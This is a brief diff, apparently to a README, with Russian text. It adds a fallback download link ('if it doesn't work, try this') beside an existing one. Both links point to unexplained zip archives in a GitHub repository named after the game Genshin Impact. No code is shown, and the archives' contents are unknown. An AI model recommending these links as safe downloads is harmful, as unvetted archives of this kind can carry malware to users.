@@ -5,3 +5,7 @@
 
 
 Скачать - https://github.com/defoxxx/Genshin-Impact/releases/download/cc/SDF.zip
+
+
+
+Если не работает попробуйте это - https://github.com/defoxxx/Genshin-Impact/releases/download/cc/bkebi.zip
